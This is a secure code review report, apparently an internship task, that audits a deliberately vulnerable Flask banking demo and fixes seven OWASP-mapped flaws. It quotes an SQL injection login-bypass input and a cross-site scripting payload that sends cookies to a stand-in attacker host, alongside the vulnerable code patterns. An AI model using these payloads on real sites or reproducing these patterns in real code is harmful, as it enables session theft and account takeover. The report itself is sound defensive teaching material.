# 🔍 Secure Coding Review — VulnBank (Demo Flask Application)

**Reviewer:** Eshginallahverdiyev
**Project:** CodeAlpha Cyber Security Internship — Task 3
**Target application:** `vulnerable_app/app.py` (Python / Flask / SQLite)
**Review type:** Manual source code audit (white-box)
**Review date:** 2026-09-01

---

## 1. Executive Summary

VulnBank is a small mock banking web application built specifically as a
target for this review. A manual line-by-line audit of the source code
identified **7 vulnerabilities**, ranging from **Critical** to **Low**
severity, mapped to the OWASP Top 10 (2021). All findings were reproduced
in code, root-caused, and fixed in a corrected version of the application
(`fixed_app/app.py`). A before/after diff for every issue is included below.

| Severity | Count |
|---|---|
| 🔴 Critical | 2 |
| 🟠 High | 3 |
| 🟡 Medium | 1 |
| 🟢 Low | 1 |

---

## 2. Methodology

1. **Static manual review** — read every route handler and data flow from
   user input to database/HTML output.
2. **Data-flow tracing** — for each `request.form` / `request.args` value,
   traced whether it reached a SQL query, an HTML template, or a
   sensitive operation without validation or sanitization.
3. **Configuration review** — checked session, secret key, and server
   startup configuration for insecure defaults.
4. **OWASP Top 10 (2021) mapping** — each finding is tagged with its
   corresponding OWASP category and, where relevant, a CWE ID.
5. **Remediation and verification** — each fix was implemented and the
   corrected file was re-read to confirm the vulnerable pattern no longer
   exists.

---

## 3. Findings

### 🔴 SC-01 — SQL Injection in `/login` (Critical)
**OWASP:** A03:2021 – Injection · **CWE-89**

**Location:** `app.py`, `login()`

**Description:** The username and password are concatenated directly into
a SQL string:

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

**Impact:** An attacker can log in as any user, dump the entire database,
or bypass authentication entirely with an input like:

```
username = admin' --
```

**Recommendation:** Always use parameterized queries / prepared
statements — never build SQL via string concatenation or f-strings.

**Fix applied:**
```python
cur = get_db().execute(
    "SELECT id, username, password_hash FROM users WHERE username = ?",
    (username,),
)
```

---

### 🔴 SC-02 — Plaintext Password Storage (Critical)
**OWASP:** A02:2021 – Cryptographic Failures · **CWE-256**

**Location:** `init_db()`, `login()`

**Description:** Passwords are stored and compared as plain text in the
`users` table (`password TEXT`).

**Impact:** A database leak (or the SQL injection in SC-01) exposes every
user's real password immediately, with no cracking effort required — and
since people reuse passwords, this endangers accounts on other services
too.

**Recommendation:** Store only a salted hash, generated with a modern
password-hashing algorithm (Werkzeug's `generate_password_hash`, which
uses PBKDF2/scrypt, or better, `argon2`), and verify with a constant-time
comparison.

**Fix applied:**
```python
password_hash = generate_password_hash(pwd)
...
check_password_hash(user.password_hash, password)
```

---

### 🟠 SC-03 — Reflected Cross-Site Scripting (XSS) in `/profile` (High)
**OWASP:** A03:2021 – Injection · **CWE-79**

**Location:** `profile()`

**Description:** The `name` query parameter is concatenated straight into
an HTML string and rendered with `render_template_string`:

```python
template = "<h1>Welcome, " + name_param + "!</h1>"
```

**Impact:** A crafted link such as
`/profile?name=<script>document.location='https://evil.example/steal?c='+document.cookie</script>`
executes attacker JavaScript in the victim's browser, enabling session
cookie theft, account takeover, or defacement.

**Recommendation:** Never build HTML via string concatenation with
untrusted input. Pass data as template *variables* (Jinja2 auto-escapes
by default) and/or explicitly escape with `markupsafe.escape()`.

**Fix applied:**
```python
template = "<h1>Welcome, {{ name }}!</h1>"
return render_template_string(template, name=escape(name_param))
```

---

### 🟠 SC-04 — Hardcoded Secret Key (High)
**OWASP:** A02:2021 – Cryptographic Failures · **CWE-798**

**Location:** `app.secret_key = "supersecret123"`

**Description:** Flask's `secret_key` signs the session cookie. A
hardcoded, low-entropy key that also ships in source control means anyone
with repo access (or who guesses it) can forge valid session cookies.

**Impact:** Full session forgery — an attacker can mint a cookie for
`user_id=1` (an admin/high-balance account) without ever authenticating.

**Recommendation:** Load the key from an environment variable or secrets
manager, generate it with a cryptographically secure random function, and
never commit it to version control.

**Fix applied:**
```python
app.secret_key = os.environ.get("VULNBANK_SECRET_KEY") or secrets.token_hex(32)
```

---

### 🟠 SC-05 — Insecure Direct Object Reference (IDOR) in `/account/<id>` (High)
**OWASP:** A01:2021 – Broken Access Control · **CWE-639**

**Location:** `account()`

**Description:** The route returns any account's username and balance for
any `account_id` in the URL, with no check that the requester owns that
account (or is even logged in).

**Impact:** Any visitor can enumerate `/account/1`, `/account/2`, … and
read every customer's balance — a serious privacy and confidentiality
breach in a banking context.

**Recommendation:** Require authentication, then verify the requested
resource belongs to the logged-in user (or that the user has an explicit
authorization to view it) before returning data.

**Fix applied:**
```python
if "user_id" not in session:
    return redirect("/login")
if account_id != session["user_id"]:
    abort(403)
```

---

### 🟡 SC-06 — Missing CSRF Protection on `/transfer` (Medium)
**OWASP:** A01:2021 – Broken Access Control · **CWE-352**

**Location:** `transfer()`

**Description:** The money-transfer endpoint is a state-changing POST
request with no CSRF token, so it will accept a request forged by a
malicious third-party page while the victim is logged in.

**Impact:** An attacker can host a page that auto-submits a form to
`/transfer`, moving funds out of a logged-in victim's account without
their knowledge.

**Recommendation:** Enable CSRF protection framework-wide (e.g.
`Flask-WTF`'s `CSRFProtect`) so every state-changing form requires a
valid, per-session token.

**Fix applied:**
```python
csrf = CSRFProtect(app)
```
(plus a hidden `csrf_token` field added to the transfer form in production
templates)

---

### 🟢 SC-07 — Debug Mode Enabled in Production Startup (Low)
**OWASP:** A05:2021 – Security Misconfiguration · **CWE-489**

**Location:** `app.run(debug=True, host="0.0.0.0")`

**Description:** `debug=True` exposes Werkzeug's interactive debugger,
which allows arbitrary Python code execution from the browser if an
unhandled exception occurs. Binding to `0.0.0.0` also exposes the app on
every network interface rather than just localhost.

**Impact:** If a stray exception is triggered in production, any user who
can reach the debugger endpoint can execute arbitrary code on the server.

**Recommendation:** Disable `debug` in any environment other than a
developer's own machine, drive it from an environment variable, and bind
to `127.0.0.1` unless the app is intentionally meant to be reachable
externally (behind a proper reverse proxy).

**Fix applied:**
```python
app.run(debug=False, host="127.0.0.1")
```

---

## 4. Secure Coding Recommendations (General)

Beyond the specific fixes above, the following practices are recommended
for this codebase and future development:

- **Input validation:** validate and constrain all user input (type,
  length, format) at the boundary, in addition to safe query construction.
- **Least privilege database account:** the app's DB user should only
  have the permissions it actually needs (no `DROP`/`ALTER` rights).
- **Dependency scanning:** run `pip-audit` or `safety` in CI to catch
  known-vulnerable packages.
- **Static analysis in CI:** integrate `bandit` (Python SAST) to catch
  patterns like SC-01/SC-03/SC-07 automatically on every commit.
- **Logging & monitoring:** log authentication failures and large/odd
  transfers for later review, without logging secrets or full card data.
- **HTTPS everywhere:** terminate TLS in front of the app and set
  `SESSION_COOKIE_SECURE=True` (done in the fix) so cookies are never
  sent over plaintext HTTP.
- **Rate limiting:** add login rate limiting (e.g. `Flask-Limiter`) to
  slow down credential-stuffing/brute-force attempts.

## 5. Tools Used

- Manual code review (primary method for this task)
- Cross-referenced against the **OWASP Top 10 (2021)** and **CWE** database
- `bandit` (Python static analyzer) run against `vulnerable_app/` to
  corroborate manual findings — see `bandit_report.txt`

## 6. Conclusion

All 7 identified vulnerabilities were remediated in `fixed_app/app.py`.
The corrected version applies parameterized queries, password hashing,
output escaping, environment-based secrets, access-control checks, CSRF
protection, and a safe production startup configuration. This review
demonstrates a full secure-SDLC loop: **identify → prioritize by
severity → fix → verify**.
